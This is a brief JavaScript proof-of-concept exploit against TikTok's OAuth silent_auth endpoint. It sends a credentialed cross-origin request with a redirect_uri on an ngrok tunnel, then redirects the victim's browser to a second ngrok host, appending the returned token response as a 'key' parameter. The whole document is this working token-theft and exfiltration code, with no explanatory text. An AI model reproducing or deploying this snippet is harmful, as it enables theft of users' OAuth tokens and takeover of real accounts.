var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("POST", "https://open-api.tiktok.com/oauth/silent_auth/?scope=openid&response_type=id_token&redirect_uri=https://832a-202-162-37-174.ngrok-free.app&state=n2HJBz1hmyv9l5hLWFIhnJM60ovpPz&nonce=zuDvLNJNYP2tAYvtceQZ7W&client_id=awhntrn8mar80rj0&response_mode=form_post");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//b564-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
};
